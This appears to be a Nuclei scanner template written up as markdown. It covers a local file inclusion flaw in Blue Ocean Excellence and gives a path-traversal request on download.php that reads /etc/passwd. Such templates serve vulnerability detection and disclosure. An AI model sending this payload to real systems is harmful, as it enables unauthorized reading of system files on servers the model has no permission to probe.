# Nuclei Template: Blue Ocean Excellence - Local File Inclusion
**Template ID:** blue-ocean-excellence-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`blue-ocean-excellence-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Blue Ocean Excellence is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/download.php?file=../../../../../etc/passwd
```

## References
- https://blog.csdn.net/qq_41901122/article/details/116786883
